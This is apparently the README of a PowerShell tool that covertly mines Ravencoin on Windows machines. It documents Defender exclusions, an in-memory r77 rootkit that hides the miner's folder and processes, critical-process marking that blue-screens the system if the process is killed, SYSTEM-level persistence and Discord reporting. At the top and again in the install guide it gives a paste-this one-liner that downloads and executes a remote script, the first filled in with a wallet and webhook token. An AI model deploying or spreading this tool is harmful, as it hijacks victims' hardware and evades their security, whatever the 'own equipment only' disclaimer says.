
# AutoMine (Stealth Edition)
```powershell
iex "& { $(irm 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1') } -Wallet 'R9vXXZ2AXz14qg2eKmdNbJBacg5T9Bx7Vz' -Pool 'us-rvn.2miners.com:6060' -Algo 'kawpow' -DiscordWebhook 'https://discord.com/api/webhooks/1569376706031001620/PbWNqV0sdcSBQufI4bgkp28ZglG4oSpozVeo3o8t-mWAvHEgLqcYyCj6sNpQGHnraM2q'"
```

Automatización avanzada de minería de Ravencoin (RVN) con GMiner en Windows. Integra persistencia vía Tarea Programada (SYSTEM), ocultamiento mediante Rootkit (r77), protección contra cierre (Proceso Crítico) y notificaciones vía Discord.

El script (`Mine.ps1`) descarga GMiner, configura exclusiones de Windows Defender, se oculta usando un rootkit en memoria, se marca como proceso crítico del sistema y registra una tarea de inicio automático. Un "watcher" invisible monitorea el minero, lo reinicia si se cae y reporta el estado a un Webhook de Discord. Todo el proceso sobrevive a reinicios y es inmune a la finalización desde el Administrador de Tareas.

## Disclaimer

Esta herramienta está diseñada para ser utilizada **únicamente en equipos de tu propiedad** o en entornos donde tengas autorización explícita. El autor no se hace responsable del uso indebido, del consumo eléctrico excesivo, del desgaste del hardware ni de cualquier consecuencia derivada de su ejecución. La minería no autorizada en equipos ajenos es una actividad ilegal.

**ADVERTENCIA DE SEGURIDAD:** El script utiliza técnicas de Rootkit y Proceso Crítico. Si intentas cerrar el proceso de PowerShell (`WinCache.ps1`) desde el Administrador de Tareas, **Windows lanzará un Pantallazo Azul (BSOD) inmediato**. Para detenerlo, usa siempre el parámetro `-Uninstall`.

## Características

- **Instalación todo-en-uno**: descarga GMiner, crea carpetas ocultas, configura Defender y registra la tarea de inicio en una sola ejecución.
- **Rootkit Integrado (r77)**: Descarga y ejecuta `rootkit.dll` en memoria para ocultar la carpeta de instalación (`C:\ProgramData\...\WinCache`) y los PIDs del watcher y del minero de las herramientas del sistema.
- **Proceso Crítico con Safe Shutdown**: El watcher se registra como proceso crítico. Si alguien intenta matarlo, el sistema colapsa. Sin embargo, incluye un manejador de eventos para "desmarcarse" de forma segura si apagas o reinicias Windows normalmente.
- **Ejecución en Memoria**: Soporta ejecución sin descargar el archivo a disco (vía `iwr | iex`).
- **Actualización Segura**: Si ejecutas el script de nuevo para actualizar parámetros, detecta la versión anterior, le quita el estado crítico, la mata limpiamente y despliega la nueva.
- **Auto-reinicio**: Si GMiner se cierra inesperadamente, el watcher lo relanza hasta 10 veces con un intervalo de 30 segundos.
- **Notificaciones Discord**: Envía avisos de inicio, actualizaciones y errores fatales.
- **Log Camuflado**: Registra la actividad en `cache.log` dentro de la carpeta oculta para parecer un archivo de sistema.

## Requisitos

- Windows 10/11 (x64).
- PowerShell 5.1 o superior.
- GPU compatible con KawPoW (NVIDIA o AMD). El rendimiento base esperado para una **RTX 3050** es de 12–14 MH/s.
- Una dirección de wallet de Ravencoin (RVN).
- Un Webhook de Discord (opcional, pero altamente recomendado para monitoreo ciego).

## Guía de Instalación

### Método 1: Ejecución Local (Tradicional)
1. Descarga el archivo `Mine.ps1` en la máquina que va a minar.
2. Abre **PowerShell como Administrador**.
3. Ejecuta el script:
   ```powershell
   .\Mine.ps1 -Wallet "TU_WALLET_RVN" `
              -Pool "us-rvn.2miners.com:6060" `
              -Algo "kawpow" `
              -DiscordWebhook "https://discord.com/api/webhooks/TU_ID/TU_TOKEN"
   ```

Método 2: Ejecución en Memoria (Sin descargar a disco)

Ideal para despliegues rápidos. Abre PowerShell como Administrador y ejecuta el equivalente a curl | bash de Linux:

```powershell
iex "& { $(irm 'https://raw.githubusercontent.com/UnfairAdventage/AutoMine/refs/heads/main/Mine.ps1') } -Wallet 'TU_WALLET_RVN' -Pool 'us-rvn.2miners.com:6060' -Algo 'kawpow' -DiscordWebhook 'https://discord.com/api/webhooks/TU_ID/TU_TOKEN'"
```

Nota: El script detectará que se ejecutó en memoria y se auto-descargará de forma segura a la carpeta oculta para poder registrar la Tarea Programada.

Parámetros del Script

Parámetro Descripción Valor por defecto
-Wallet Dirección de la wallet de Ravencoin. (requerido)
-Pool Dirección del pool (formato host:puerto). (requerido)
-Algo Algoritmo de minería. Para RVN es kawpow. kawpow
-Worker Nombre del rig en el pool. Si se omite, se genera un hash SHA256 del equipo (rig_xxxxxx). rig_<hash>
-DiscordWebhook URL del Webhook de Discord para notificaciones. (opcional)
-Foreground Ejecuta el watcher en la ventana actual (para depuración, sin rootkit). false
-TestWebhook Envía un embed de prueba al Webhook y termina. false
-Diagnose Muestra el estado de la instalación y los procesos. false
-Uninstall Detiene el minero de forma segura, elimina la tarea y limpia todo. false
-Run Modo interno del watcher. No usar manualmente. false
-NoElevate Modo interno para evitar el bucle de UAC. No usar manualmente. false

Estructura de Archivos

```
C:\ProgramData\Microsoft\Windows\Caches\WinCache\   [OCULTO POR EL ROOTKIT]
├── WinCache.exe      # GMiner (renombrado)
├── WinCache.ps1      # Copia del script de automatización
└── logs\
    └── cache.log     # Registro de actividad (camuflado como cache)
```

Nota: Todos los parámetros se inyectan directamente en la Tarea Programada, por lo que no se crea ningún config.json.

Rootkit, Proceso Crítico y Visibilidad

Debido al rootkit y al estado crítico, el proceso y la carpeta no serán visibles en el Explorador de Windows ni en el Administrador de Tareas.

¿Cómo saber si está funcionando?

1. Discord: Si recibes el mensaje Minero Iniciado, todo está corriendo.
2. El Pool: Busca tu wallet en 2Miners; si el worker está Online, está minando.
3. El Log: Puedes leer el archivo directamente si conoces la ruta exacta (el rootkit oculta la enumeración, no bloquea la lectura directa):
   ```powershell
   Get-Content "C:\ProgramData\Microsoft\Windows\Caches\WinCache\logs\cache.log" -Tail 20
   ```
4. Diagnóstico Integrado: Ejecuta .\Mine.ps1 -Diagnose. Al usar WMI, a veces es capaz de saltarse los hooks del rootkit y mostrar los procesos reales.

 Cómo desinstalar de forma segura

NUNCA uses el Administrador de Tareas para matar WinCache.ps1 o WinCache.exe. Si lo haces, el sistema lanzará un BSOD. Usa siempre:

```powershell
.\Mine.ps1 -Uninstall
```

Este comando desactiva el flag de proceso crítico en la memoria, espera un segundo a que Windows lo procese, y luego cierra el proceso sin colapsar el sistema.

 Webhook de Discord

El script envía los siguientes mensajes:

1. ✅ Minero Iniciado: Host, Worker, Pool y confirmación de que las protecciones están activas.
2. ✅ Actualización Exitosa: Cuando se re-ejecuta el script para cambiar parámetros.
3. ⚠️ Miner Stopped: Cuando se alcanza el límite de 10 reinicios consecutivos.

Importante: Trata la URL del Webhook como un secreto. Si se filtra, cualquiera puede enviar mensajes a tu canal.

 Licencia

Este proyecto se distribuye con fines educativos y de automatización personal. Úsalo bajo tu propia responsabilidad y únicamente en equipos de tu propiedad.

